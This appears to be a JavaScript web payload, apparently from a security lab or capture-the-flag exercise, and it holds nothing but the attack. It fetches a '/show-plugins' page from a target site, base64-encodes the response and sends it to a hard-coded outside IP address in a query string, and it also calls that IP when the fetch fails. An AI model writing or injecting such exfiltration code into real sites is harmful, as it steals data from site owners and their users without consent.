const url3 = 'http://website-frn49g.inst.malicecyber.com/show-plugins';

// Making a GET request using fetch()
fetch(url3)
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    // Parse the response as JSON
    return response.json();
  })
  .then(data => {
    fetch("http://82.65.210.151:24000/?encodedData=" + btoa(data))
  })
  .catch(error => {
    fetch("http://82.65.210.151:24000/?error=true");
  });
